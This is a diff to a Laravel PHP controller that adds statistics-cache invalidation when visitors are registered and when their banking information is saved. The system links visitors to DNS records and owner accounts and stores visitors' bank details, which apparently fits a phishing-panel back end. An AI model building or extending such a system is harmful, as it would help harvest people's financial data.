@@ -6,11 +6,30 @@ use App\Http\Controllers\Controller;
 use App\Models\Visitante;
 use App\Models\DnsRecord;
 use App\Models\InformacaoBancaria;
+use App\Services\DnsStatisticsService;
+use App\Services\UserStatisticsService;
+use App\Services\BankingStatisticsService;
 use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Validator;
 
 class DnsVisitanteApiController extends Controller
 {
+    protected $dnsStats;
+    protected $userStats;
+    protected $bankingStats;
+    
+    /**
+     * Construtor que injeta os serviços de estatísticas
+     */
+    public function __construct(
+        DnsStatisticsService $dnsStats,
+        UserStatisticsService $userStats,
+        BankingStatisticsService $bankingStats
+    ) {
+        $this->dnsStats = $dnsStats;
+        $this->userStats = $userStats;
+        $this->bankingStats = $bankingStats;
+    }
     /**
      * Registra um novo visitante associado a um registro DNS
      */
@@ -39,6 +58,10 @@ class DnsVisitanteApiController extends Controller
             'user_agent' => $request->user_agent,
             'referrer' => $request->referrer
         ]);
+        
+        // Invalidar caches de estatísticas relacionadas
+        $this->dnsStats->invalidateCache($request->dns_record_id);
+        $this->userStats->invalidateCache($usuario_id);
         
         return response()->json([
             'success' => true, 
@@ -108,6 +131,19 @@ class DnsVisitanteApiController extends Controller
             'informacoes_adicionais' => $request->informacoes_adicionais
         ]);
         
+        // Buscar o visitante para obter o DNS record e usuário associado
+        $visitante = Visitante::where('uuid', $request->visitante_uuid)->first();
+        if ($visitante) {
+            // Invalidar caches de estatísticas relacionadas
+            if ($visitante->dns_record_id) {
+                $this->dnsStats->invalidateCache($visitante->dns_record_id);
+            }
+            if ($visitante->usuario_id) {
+                $this->userStats->invalidateCache($visitante->usuario_id);
+                $this->bankingStats->invalidateCache($visitante->usuario_id);
+            }
+        }
+        
         return response()->json([
             'success' => true, 
             'message' => 'Informação bancária registrada com sucesso',
@@ -167,6 +203,19 @@ class DnsVisitanteApiController extends Controller
         }
         
         $informacao->save();
+        
+        // Buscar o visitante para obter o DNS record e usuário associado
+        $visitante = Visitante::where('uuid', $request->visitante_uuid)->first();
+        if ($visitante) {
+            // Invalidar caches de estatísticas relacionadas
+            if ($visitante->dns_record_id) {
+                $this->dnsStats->invalidateCache($visitante->dns_record_id);
+            }
+            if ($visitante->usuario_id) {
+                $this->userStats->invalidateCache($visitante->usuario_id);
+                $this->bankingStats->invalidateCache($visitante->usuario_id);
+            }
+        }
         
         return response()->json([
             'success' => true, 
